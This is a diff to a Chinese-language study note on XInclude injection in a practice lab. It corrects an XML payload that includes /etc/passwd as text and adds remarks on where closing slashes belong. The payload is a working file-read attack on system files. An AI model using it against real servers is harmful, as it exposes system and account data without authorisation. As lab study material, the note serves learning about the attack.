@@ -64,7 +64,11 @@ Xinclude：使用前需要做前缀声明
 ### 靶场利用
 ```xml
 <root xmlns:xi="http://www.w3.org/2001/XInclude">
-<xi:include href="/etc/passwd" parse="text">
+<xi:include href="/etc/passwd" parse="text"/>
 </root>
 ```
-在实际利用不能有<mark style="background: #FFB8EBA6;">换行符</mark>
+在声明xinclude末尾没有斜杠
+包含xml文件的末尾有斜杠
+
+![](assets/Xinclude/file-20260106221617982.png)
+
